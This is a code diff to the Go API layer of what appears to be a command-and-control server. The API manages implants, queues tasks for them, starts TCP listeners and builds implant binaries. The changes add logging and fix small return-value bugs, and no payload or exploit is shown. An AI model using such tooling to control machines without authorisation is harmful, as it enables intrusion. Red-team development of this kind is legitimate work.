@@ -13,7 +13,6 @@ import (
 	"encoding/json"
 	"errors"
 	"log"
-	"math/rand"
 	"reflect"
 	"strconv"
 	"time"
@@ -24,13 +23,13 @@ var runningsListeners []listener.Listener
 // Adds a task to be executed for a specific implant. The taskArguments parameter should be a serializable type, see /lib/serializable
 // to see the types of requests a server can make to the implant.
 func AddTaskForImplant(implantId string, taskType int, taskArguments *communication.Task) (string, error) {
+	log.Printf("[INFO] API: attempting to create task with type %d for implant with ID %s.", taskType, implantId)
 	//use reflection to check that taskType and taskArguments correspond
 	expectedType := reflect.TypeOf(communication.MessageTypeToStruct[taskType]())
 	actualType := reflect.TypeOf(*taskArguments).Elem()
 	if !actualType.AssignableTo(expectedType) && !reflect.PointerTo(actualType).AssignableTo(expectedType) {
 		return "", errors.New("taskType and taskArguments don't correspond")
 	}
-	rand.Uint32()
 	id := cryptography.GenerateMd5FromStrings(implantId, strconv.FormatInt(time.Now().UnixNano(), 10))
 	(*taskArguments).SetTaskId(id) //Set the taskId of the arguments.
 
@@ -55,6 +54,7 @@ func AddTaskForImplant(implantId string, taskType int, taskArguments *communicat
 
 // Remove a task for an implant that is yet to be executed.
 func RemovePendingTaskForImplant(implantId string, taskId string) error {
+	log.Printf("[INFO] API: Attempting to remove pending task with ID: %s", taskId)
 	err := db.RemovePendingTaskForImplant(implantId, taskId)
 	return err
 }
@@ -62,32 +62,34 @@ func RemovePendingTaskForImplant(implantId string, taskId string) error {
 // Given an implantId, returns tasks belonging to this implant. The "completed" parameter determins whether the tasks returned
 // have already been completed and thus have a result.
 func GetTasksForImplant(implantId string, completed bool) ([]*db.Implant_task, error) {
+	log.Printf("[INFO] API: Attemping to fetch tasks for implant with ID: %s", implantId)
 	tasks, err := db.GetTasks(implantId, completed)
 	if err != nil {
 		return nil, err
 	}
-
 	return tasks, nil
 }
 
 // Given a task ID, returns all information about the task.
 func GetTask(taskId string) (*db.Implant_task, error) {
+	log.Printf("[INFO] API: Attempting to fetch task with ID: %s", taskId)
 	task, err := db.GetTask(taskId)
 	if err != nil {
 		return nil, err
 	}
-
 	return task, nil
 }
 
 // Checks if implant with implantId exists in our database
 func ImplantExists(implantId string) bool {
+	log.Printf("[INFO] API: checking if implant with id: %s exists.", implantId)
 	_, err := db.GetImplantInfo(implantId)
 	if err != nil {
 		if err == db.ErrNoResults {
 			return false
 		} else {
 			log.Printf("[ERROR] encountered error while checking for existance of implant with ID: %s. Reason: %s ", implantId, err.Error())
+			return false
 		}
 	}
 	return true
@@ -95,17 +97,20 @@ func ImplantExists(implantId string) bool {
 
 // Returns information about all implants registered in the DB.
 func GetAllImplants() ([]*db.Implant_info, error) {
+	log.Printf("[INFO] API: Attempting to fetch all implant information")
 	return db.GetAllImplants()
 }
 
 // Gets the "active" status from an implant
 func GetImplantStatus(implantId string) (bool, error) {
+	log.Printf("[INFO] API: Attemping to fetch active-status of implant with ID: %s.", implantId)
 	return db.GetImplantStatus(implantId)
 }
 
 // Starts a TCP listener on the specified port and network. E.g. network="127.0.0.1" port=4444. Leave network empty to listen
 // on all available interfaces.
 func AddListener(network string, port int) error {
+	log.Printf("[INFO] API: Attempting to start listener on %s:%d", network, port)
 	var ls listener.Listener = listener.Listener{Type: "tcp", Handler: handlers.TcpHandler, Network: network, Port: port}
 	err := ls.Start()
 	if err != nil {
@@ -118,6 +123,7 @@ func AddListener(network string, port int) error {
 
 // Returns a list of all running jobs
 func GetRunningListeners() (*[]listener.Listener, error) {
+	log.Printf("[INFO] API: Attemping to get running listeners.")
 	if len(runningsListeners) == 0 {
 		return nil, errors.New("no listeners running")
 	}
@@ -126,6 +132,7 @@ func GetRunningListeners() (*[]listener.Listener, error) {
 
 // Kills job with given ID.
 func KillListener(listenerId int) error {
+	log.Printf("[INFO] API: Attemping to kill listener with ID: %d", listenerId)
 	if listenerId < 0 || listenerId >= len(runningsListeners) {
 		return errors.New("no listener with that ID")
 	}
@@ -134,18 +141,20 @@ func KillListener(listenerId int) error {
 	return nil
 }
 
-func BuildImplant(config *builder.BuilderConfig) error {
+// Given an implant configuration, invokes go build and generates an implant binary
+func BuildImplant(config *builder.BuilderConfig) (string, error) {
+	log.Printf("[INFO] API: Build implant started.")
 	if config.ImplantName == "" {
 		config.ImplantName = utils.GenerateRandomName()
 	}
 	if config.ServerPort < 0 || config.ServerPort > 65535 {
-		return errors.New("not a valid port number")
+		return "", errors.New("not a valid port number")
 	}
 
 	pub, err := db.GetPublicKey()
 	if err != nil {
-		log.Printf("Could not fetch public key from database while trying to build implant. Reason: %s", err.Error())
-		return err
+		log.Printf("[ERROR] Could not fetch public key from database while trying to build implant. Reason: %s", err.Error())
+		return "", err
 	}
 	config.PublicKey = pub
 
